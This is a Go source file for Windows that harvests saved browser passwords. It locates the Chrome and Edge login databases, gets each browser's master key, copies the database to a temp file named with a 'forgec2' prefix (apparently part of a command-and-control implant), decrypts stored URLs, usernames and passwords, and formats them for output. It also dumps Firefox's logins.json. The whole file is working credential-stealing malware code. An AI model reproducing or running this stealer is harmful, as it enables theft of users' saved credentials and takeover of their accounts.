//go:build windows
// +build windows

package main

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	_ "modernc.org/sqlite"
)

type browserPasswordStore struct {
	Name       string
	LocalState string
	LoginDBs   []string
}

func exportBrowserPasswords(browser string) string {
	stores := []browserPasswordStore{
		{
			Name:       "Chrome",
			LocalState: os.ExpandEnv(`%LOCALAPPDATA%\Google\Chrome\User Data\Local State`),
			LoginDBs: []string{
				os.ExpandEnv(`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`),
			},
		},
		{
			Name:       "Edge",
			LocalState: os.ExpandEnv(`%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`),
			LoginDBs: []string{
				os.ExpandEnv(`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`),
			},
		},
	}

	filter := strings.ToLower(strings.TrimSpace(browser))
	if filter == "" || filter == "all" {
		filter = "all"
	}

	var sb strings.Builder
	for _, store := range stores {
		if filter != "all" && filter != strings.ToLower(store.Name) {
			continue
		}
		sb.WriteString(exportStorePasswords(store))
	}

	if filter == "all" || filter == "firefox" {
		sb.WriteString(exportFirefoxLogins())
	}

	if sb.Len() == 0 {
		return "no browser password databases found\n"
	}
	return sb.String()
}

func exportStorePasswords(store browserPasswordStore) string {
	var loginDB string
	for _, candidate := range store.LoginDBs {
		if _, err := os.Stat(candidate); err == nil {
			loginDB = candidate
			break
		}
	}
	if loginDB == "" {
		return fmt.Sprintf("=== %s Passwords ===\n(not found)\n", store.Name)
	}

	masterKey, err := getBrowserMasterKey(store.LocalState)
	if err != nil {
		return fmt.Sprintf("=== %s Passwords ===\nmaster key error: %v\n", store.Name, err)
	}

	tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("forgec2_logins_%s.db", strings.ToLower(store.Name)))
	data, err := os.ReadFile(loginDB)
	if err != nil {
		return fmt.Sprintf("=== %s Passwords ===\nread error: %v\n", store.Name, err)
	}
	if err := os.WriteFile(tmpCopy, data, 0644); err != nil {
		return fmt.Sprintf("=== %s Passwords ===\ncopy error: %v\n", store.Name, err)
	}
	defer os.Remove(tmpCopy)

	db, err := sql.Open("sqlite", tmpCopy)
	if err != nil {
		return fmt.Sprintf("=== %s Passwords ===\nsqlite open error: %v\n", store.Name, err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins LIMIT 500`)
	if err != nil {
		return fmt.Sprintf("=== %s Passwords ===\nquery error: %v\n", store.Name, err)
	}
	defer rows.Close()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== %s Passwords ===\n", store.Name))
	count := 0
	for rows.Next() {
		var url, user string
		var enc []byte
		if err := rows.Scan(&url, &user, &enc); err != nil {
			continue
		}
		pass := decryptCookieValue(enc, masterKey)
		sb.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\n---\n", url, user, pass))
		count++
	}
	sb.WriteString(fmt.Sprintf("--- exported %d logins ---\n", count))
	return sb.String()
}

func exportFirefoxLogins() string {
	matches, _ := filepath.Glob(os.ExpandEnv(`%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json`))
	if len(matches) == 0 {
		return "=== Firefox Passwords ===\n(not found)\n"
	}
	data, err := os.ReadFile(matches[0])
	if err != nil {
		return fmt.Sprintf("=== Firefox Passwords ===\nread error: %v\n", err)
	}
	return fmt.Sprintf("=== Firefox Passwords ===\n(logins.json — credentials are NSS-encrypted; close Firefox and use dedicated tooling)\n%s\n", string(data))
}